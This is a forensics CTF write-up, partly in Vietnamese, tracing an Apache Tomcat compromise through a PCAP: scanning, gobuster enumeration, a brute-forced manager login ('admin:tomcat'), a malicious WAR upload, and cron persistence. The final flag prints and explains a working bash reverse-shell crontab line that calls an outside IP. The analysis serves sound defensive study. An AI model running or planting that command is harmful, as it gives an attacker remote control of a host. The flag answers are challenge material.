# Mô tả

The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.

# Phân tích

## Flag 1 2 3

Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server? `14.0.0.120`

Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated? `China`

From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel? `8080`

## Flag 4 

Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

Trong quá trình enumerate các thư mục trên server thì tool thương sẽ chạy quét gửi GET đến nhiều thư mục khác nhau mà một server thường có vậy nên sẽ hiện ra rất nhiều các request đến nhưng thư mục không tồn tại trên server(Lúc đó sẽ trả về code 404 not found) thì ta chỉ cần kiểm tra phần `User Agent`(Được thực hiện từ phần mềm nào) của request đó, thông thường nếu ta GET 1 trang web thì `User Agent` của ta sẽ là Mozilla, Chrome, ... ở đây của hacker sẽ khác biệt

```
GET /docs/ HTTP/1.1
Host: 10.0.0.112:8080
User-Agent: gobuster/3.6
Accept-Encoding: gzip
```



`gobuster`

## Flag 5

After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?

Tìm đến những request mà có response code = 200(Thành công) liên qua đến admin như là manager, admin-panel, ..., có thể lướt đến cuối cùng sau các response 404 để biết được hacker đã tìm thấy gì

`/manager`

## Flag 6

After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?

```
GET /manager/html HTTP/1.1
Host: 10.0.0.112:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Authorization: Basic YWRtaW46dG9tY2F0
```

Sau đó là lúc hacker chạy bruteforce các tài khoản và mật khẩu khác nhau, tài khoản và mật khẩu mà hacker đã sử dụng sẽ được để trong phần `Authorization` của request header và được mã hoá bằng b64, ta cũng có thể thấy trong pcap nhiều response code 401 - unauthorized đó sẽ là những creds bị sai.

Muốn tìm creds đúng thì sẽ tìm request đến `/manager/html` được trả về code 200 là được (Như ví dụ trên)

`YWRtaW46dG9tY2F0` dịch ra là `admin:tomcat`

## Flag 7

Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

Sau đó một vài packet hacker gửi 1 request POST

```
POST /manager/html/upload;jsessionid=0DE586F27B2F48D0CA045F731E0E9E71?org.apache.catalina.filters.CSRF_NONCE=83EDF4E2462ECC725BAF342DD7A46974 HTTP/1.1
Host: 10.0.0.112:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.0.0.112:8080/manager/html
Content-Type: multipart/form-data; boundary=---------------------------309854885940911807712888696060
Content-Length: 1324
Origin: http://10.0.0.112:8080
Authorization: Basic YWRtaW46dG9tY2F0
Connection: keep-alive
Cookie: JSESSIONID=0DE586F27B2F48D0CA045F731E0E9E71
Upgrade-Insecure-Requests: 1

-----------------------------309854885940911807712888696060
Content-Disposition: form-data; name="deployWar"; filename="JXQOZY.war"
Content-Type: application/octet-stream
```

File độc hại ở đây là `JXQOZY.war`

## Flag 8

After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

Trong tcp stream `9461`(ở cuối file pcap) sau khi đã upload file độc hại lấy shell thì hacker thực hiện persistence qua cronjob 

```
whoami

root

cd /tmp
pwd

/tmp

echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron
crontab -i cron
crontab -l

* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

`* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'` 

- `* * * * * `: Chạy lệnh mỗi 60s

- `bash -i`: Chạy interactive shell của bash
- `\>& /dev/tcp/14.0.0.120/443`: Chuyển hướng input và output của bash đến `14.0.0.120` qua port 443 qua TCP
- `0>&1'`: Nghĩa là chuyển hướng đầu vào (stdin – 0) đến đầu ra (stdout – 1). Những gì gõ từ phía máy tấn công (qua kết nối TCP) sẽ được chuyển thành đầu vào cho Bash

Nói chung là lệnh này muốn kết nối đến `14.0.0.120:443` và nếu hacker đang listen trên đó thì sẽ có được shell và chạy mỗi 60s để đảm bảo duy trì kết nối

`* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`
